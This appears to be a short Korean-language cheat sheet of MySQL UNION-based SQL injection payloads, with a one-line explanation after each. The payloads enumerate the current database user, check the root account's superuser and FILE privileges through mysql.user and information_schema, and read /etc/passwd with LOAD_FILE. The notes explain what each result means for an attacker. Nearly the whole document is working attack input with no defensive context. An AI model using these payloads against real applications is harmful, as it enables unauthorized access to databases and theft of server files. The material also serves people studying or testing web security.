# 현재 DB 사용자 조회

```
' UNION SELECT NULL, user(), NULL, NULL-- -
' UNION SELECT NULL, user, NULL, NULL from mysql.user-- -
```

설명: 현재 사용자가 루트로 조회된다면, 관리자(DBA) 권한이 있다는 뜻이다. 그리고 DBA가 있으면 파일 읽기 권한이 있을 확률이 훨씬 더 높다.

# 사용자 권한 조회

```
' UNION SELECT NULL, super_priv, NULL, NULL FROM mysql.user WHERE user="root"-- -
```

설명1: 현재 사용자가 root@localhost 일 때를 기준으로 작성 됨<br>
설명2: 만약에 Y가 반환된다면, 슈퍼 유저라는 의미

# 현재 사용자의 모든 권한 조회

```
' UNION SELECT NULL, grantee, privilege_type, NULL FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

설명1: 현재 사용자가 root@localhost 일 때를 기준으로 작성 됨<br>
설명2: 만약에 FILE이 출력된다면, 파일을 읽을 수 있고 잠재적으로 파일을 쓸 수도 있음을 의미

# 파일 읽기

```
' UNION SELECT NULL, LOAD_FILE("/etc/passwd"), NULL, NULL-- -
```

설명: 현재 페이지 파일을 로딩하면 Ctrl+U로 HTML 소스 확인하기
